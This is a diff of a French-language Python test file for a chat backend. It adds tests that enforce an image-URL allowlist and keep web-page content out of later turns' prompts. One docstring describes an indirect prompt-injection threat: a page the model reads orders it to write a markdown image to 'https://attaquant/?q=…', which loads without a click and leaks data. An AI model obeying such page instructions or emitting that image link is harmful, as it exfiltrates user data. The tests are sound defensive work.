@@ -143,9 +143,11 @@ class _Base(unittest.TestCase):
             patcher.start()
             self.addCleanup(patcher.stop)
 
-    def _envoyer(self, texte, web_search_override=False):
+    def _envoyer(self, texte, web_search_override=False, conversation_id=None):
         corps = {"role": "user", "content": texte, "direct": True,
                  "web_search_override": web_search_override}
+        if conversation_id is not None:
+            corps["conversation_id"] = conversation_id
         with self.client.websocket_connect(_WS.format(t=self.token)) as ws:
             ws.send_text(json.dumps(corps))
             trames, conv_id = [], None
@@ -154,6 +156,7 @@ class _Base(unittest.TestCase):
                 if t["type"] == "conversation":
                     conv_id = t["id"]
                     continue
+                conv_id = conv_id or conversation_id
                 trames.append(t)
                 if t["type"] in ("done", "error"):
                     return trames, conv_id
@@ -397,6 +400,65 @@ class OutilsRetiresTousChemins(_Base):
         _trames, conv_id = self._envoyer("explique le théorème de Rolle")
         self.assertIn("web_search", self.kwargs_stream[-1]["outils"])
         self.assertNotIn("outils_retires", [e["etape"] for e in self._trace(conv_id)])
+
+
+class ImagesAutoriseesTest(_Base):
+    """Trame `images_autorisees` : l'ensemble de référence du tour, envoyé
+    AVANT le premier token et persisté sur la réponse — le frontend ne charge
+    aucune image hors de cette liste (`ImagesAutoriseesContext`). Une page lue
+    peut ordonner « écris ![](https://attaquant/?q=…) » : une <img> se charge
+    sans clic, et la CSP `img-src` n'est qu'en observation."""
+
+    def test_trame_avant_le_premier_token_et_persistee(self):
+        texte = f"Résume {_URL} et compare avec https://autre.example/doc"
+        trames, conv_id = self._envoyer(texte)
+        types = [t["type"] for t in trames]
+        self.assertIn("images_autorisees", types)
+        self.assertLess(types.index("images_autorisees"), types.index("token"))
+        urls = next(t for t in trames if t["type"] == "images_autorisees")["urls"]
+        # La page lue ET les URLs du message (ensemble de référence complet).
+        self.assertIn(_URL, urls)
+        self.assertIn("https://autre.example/doc", urls)
+        self.assertEqual(trames[-1]["images_autorisees"], urls)
+        dernier = history_engine.get_conversation(conv_id)["messages"][-1]
+        self.assertEqual(dernier["images_autorisees"], urls)
+
+    def test_sans_url_ni_trame_ni_champ(self):
+        trames, conv_id = self._envoyer("explique le théorème de Rolle")
+        self.assertNotIn("images_autorisees", [t["type"] for t in trames])
+        self.assertNotIn("images_autorisees", trames[-1])
+        self.assertNotIn("images_autorisees", history_engine.get_conversation(conv_id)["messages"][-1])
+
+
+class TourSuivantTest(_Base):
+    """Le contenu extrait d'une page n'existe QUE dans le prompt système du
+    tour qui l'a lue (`sys_parts`, reconstruit à chaque tour, jamais
+    persisté). Au tour suivant, seules restent les métadonnées : sources
+    citées (rang, titre, url) et trace (url, statut, nombre de passages)."""
+
+    def test_second_tour_sans_aucun_passage_de_la_page(self):
+        self.reponse_modele = "D'après [1], la dérivée s'annule."
+        _trames, conv_id = self._envoyer(f"Résume {_URL}")
+        self.assertIn("dérivée nulle", json.dumps(self.prompts[-1], ensure_ascii=False))
+
+        self.reponse_modele = "Suite."
+        self._envoyer("et pour une fonction non dérivable ?", conversation_id=conv_id)
+        prompt_2 = self.prompts[-1]
+        brut = json.dumps(prompt_2, ensure_ascii=False)
+
+        # Aucun passage de la page, sous aucune clé, à aucune position.
+        self.assertNotIn("dérivée nulle", brut)
+        self.assertNotIn("Paragraphe", brut)
+        self.assertNotIn("Contenu de page(s) web", brut)
+        self.assertEqual(self.ouvertures, [_URL])  # pas relue au second tour
+
+        # Seulement les métadonnées sources sur la réponse du premier tour.
+        reponse_1 = next(m for m in prompt_2 if m.get("role") == "assistant")
+        self.assertEqual(reponse_1["content"], "D'après [1], la dérivée s'annule.")
+        self.assertEqual(reponse_1["sources"],
+                         [{"rang": 1, "titre": "Le théorème de Rolle", "url": _URL}])
+        lecture = next(e for e in reponse_1["trace_recherche"] if e["etape"] == "lecture_url")
+        self.assertLessEqual(set(lecture), {"etape", "url", "statut", "ms", "passages_retenus", "raison"})
 
 
 class TexteSansUrlsTest(unittest.TestCase):
